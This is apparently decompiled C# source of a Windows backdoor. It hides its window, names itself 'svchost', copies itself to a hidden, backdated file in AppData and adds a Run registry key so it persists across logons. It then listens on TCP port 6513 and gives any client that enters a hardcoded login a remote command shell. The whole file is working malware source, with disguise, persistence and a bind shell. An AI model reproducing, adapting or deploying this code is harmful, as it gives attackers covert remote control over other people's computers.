using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace mswin32.dll;

[DesignerGenerated]
public class Form1 : Form
{
	public delegate void _Client_Thread(TcpClient cl);

	private TcpListener server;

	private TcpClient cliente;

	private IContainer components;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		server = new TcpListener(IPAddress.Any, 6513);
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		Install();
		Thread thread = new Thread(ListeN);
		thread.Start();
	}

	public void Client_Thread(TcpClient Cl)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Shell shell = default(Shell);
		string command = default(string);
		StreamReader streamReader = default(StreamReader);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 575:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0019;
						case 4:
							goto IL_0027;
						case 5:
						case 8:
						case 9:
							goto IL_0042;
						case 10:
							goto IL_0051;
						case 11:
							goto IL_005b;
						case 12:
							goto IL_0066;
						case 13:
							goto IL_0075;
						case 14:
							goto IL_007f;
						case 15:
							goto IL_008a;
						case 16:
							goto IL_00b4;
						case 17:
							goto IL_00c3;
						case 18:
							goto IL_00cd;
						case 19:
							goto IL_00dc;
						case 20:
							goto IL_00eb;
						case 21:
							goto IL_00f5;
						case 22:
							goto IL_0104;
						case 23:
							goto IL_010e;
						case 24:
							goto IL_011d;
						case 25:
						case 28:
						case 29:
							goto IL_0127;
						case 30:
							goto IL_0132;
						case 33:
							goto IL_013e;
						case 34:
							goto IL_014d;
						case 35:
							goto IL_0158;
						case 31:
						case 32:
						case 36:
							goto IL_0164;
						case 37:
							goto IL_016f;
						case 26:
							goto IL_017b;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 7:
						case 27:
						case 38:
						case 39:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0158:
					num = 35;
					shell.ExecuteCommand(command);
					goto IL_0164;
					IL_014d:
					num = 34;
					command = streamReader.ReadLine();
					goto IL_0158;
					IL_000a:
					num = 2;
					streamWriter = new StreamWriter(Cl.GetStream());
					goto IL_0019;
					IL_0019:
					num = 3;
					streamReader = new StreamReader(Cl.GetStream());
					goto IL_0027;
					IL_0027:
					num = 4;
					if (Operators.CompareString(streamReader.ReadLine(), "System Login", false) != 0)
					{
						break;
					}
					goto IL_0042;
					IL_0042:
					num = 9;
					streamWriter.Write("Login: ");
					goto IL_0051;
					IL_0051:
					num = 10;
					streamWriter.Flush();
					goto IL_005b;
					IL_005b:
					num = 11;
					text = streamReader.ReadLine();
					goto IL_0066;
					IL_0066:
					num = 12;
					streamWriter.Write("Password: ");
					goto IL_0075;
					IL_0075:
					num = 13;
					streamWriter.Flush();
					goto IL_007f;
					IL_007f:
					num = 14;
					text2 = streamReader.ReadLine();
					goto IL_008a;
					IL_008a:
					num = 15;
					if (Operators.CompareString(text, "LvMalware", false) == 0 && Operators.CompareString(text2, "password", false) == 0)
					{
						goto IL_00b4;
					}
					goto IL_017b;
					IL_017b:
					num = 26;
					Cl.Close();
					goto end_IL_0001_3;
					IL_00b4:
					num = 16;
					streamWriter.WriteLine("");
					goto IL_00c3;
					IL_00c3:
					num = 17;
					streamWriter.Flush();
					goto IL_00cd;
					IL_00cd:
					num = 18;
					streamWriter.WriteLine("Welcome master LvMalware!!!");
					goto IL_00dc;
					IL_00dc:
					num = 19;
					streamWriter.WriteLine("Here's the shell: ");
					goto IL_00eb;
					IL_00eb:
					num = 20;
					streamWriter.Flush();
					goto IL_00f5;
					IL_00f5:
					num = 21;
					streamWriter.WriteLine("");
					goto IL_0104;
					IL_0104:
					num = 22;
					streamWriter.Flush();
					goto IL_010e;
					IL_010e:
					num = 23;
					streamWriter.WriteLine("");
					goto IL_011d;
					IL_011d:
					num = 24;
					streamWriter.Flush();
					goto IL_0127;
					IL_0127:
					num = 29;
					shell = new Shell(Cl);
					goto IL_0132;
					IL_0132:
					num = 30;
					shell.Start();
					goto IL_0164;
					IL_0164:
					num = 32;
					if (Cl.Connected)
					{
						goto IL_013e;
					}
					goto IL_016f;
					IL_016f:
					num = 37;
					shell.Stop();
					goto end_IL_0001_3;
					IL_013e:
					num = 33;
					streamReader = new StreamReader(Cl.GetStream());
					goto IL_014d;
					end_IL_0001_2:
					break;
				}
				num = 6;
				Cl.Close();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 575;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void ListeN()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		_Client_Thread client_Thread = default(_Client_Thread);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 151:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 5:
							goto IL_0019;
						case 6:
							goto IL_0026;
						case 7:
							goto IL_0039;
						case 8:
							goto IL_0048;
						case 3:
						case 4:
						case 9:
							goto IL_0059;
						default:
							goto end_IL_0001;
						case 10:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_0048:
					num = 8;
					client_Thread.BeginInvoke(cliente, null, null);
					goto IL_0059;
					IL_0039:
					num = 7;
					client_Thread = Client_Thread;
					goto IL_0048;
					IL_000a:
					num = 2;
					server.Start();
					goto IL_0059;
					IL_0059:
					num = 4;
					goto IL_0019;
					IL_0019:
					num = 5;
					cliente = new TcpClient();
					goto IL_0026;
					IL_0026:
					num = 6;
					cliente = server.AcceptTcpClient();
					goto IL_0039;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 151;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Install()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey registryKey = default(RegistryKey);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 166:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_002e;
						case 5:
							goto IL_0037;
						case 6:
							goto IL_0045;
						case 7:
							goto IL_0058;
						case 8:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 9:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0058:
					num = 7;
					registryKey.SetValue("mswin32", text);
					break;
					IL_0045:
					num = 6;
					registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					goto IL_0058;
					IL_000a:
					num = 2;
					text = Environment.ExpandEnvironmentVariables("%AppData%") + "\\mswin32.dll.exe";
					goto IL_0021;
					IL_0021:
					num = 3;
					FileSystem.FileCopy(Application.get_ExecutablePath(), text);
					goto IL_002e;
					IL_002e:
					num = 4;
					File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
					goto IL_0037;
					IL_0037:
					num = 5;
					File.SetCreationTime(text, RandomDate());
					goto IL_0045;
					end_IL_0001_2:
					break;
				}
				num = 8;
				registryKey.Close();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 166;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public DateTime RandomDate()
	{
		string text = "dd/mm/201a h:m:s";
		VBMath.Randomize();
		object obj = Conversion.Int(VBMath.Rnd() * 28f) + 1f;
		string text2 = text.Replace("dd", Conversions.ToString(obj));
		obj = Conversion.Int(VBMath.Rnd() * 12f) + 1f;
		text2 = text2.Replace("mm", Conversions.ToString(obj));
		obj = Conversion.Int(VBMath.Rnd() * 6f) + 1f;
		text2 = text2.Replace("a", Conversions.ToString(obj));
		obj = Conversion.Int(VBMath.Rnd() * 12f) + 1f;
		text2 = text2.Replace("h", Conversions.ToString(obj));
		obj = Conversion.Int(VBMath.Rnd() * 58f) + 1f;
		text2 = text2.Replace("m", Conversions.ToString(obj));
		obj = Conversion.Int(VBMath.Rnd() * 58f) + 1f;
		text2 = text2.Replace("s", Conversions.ToString(obj));
		return DateTime.Parse(text2);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(133, 77));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("svchost");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}
}
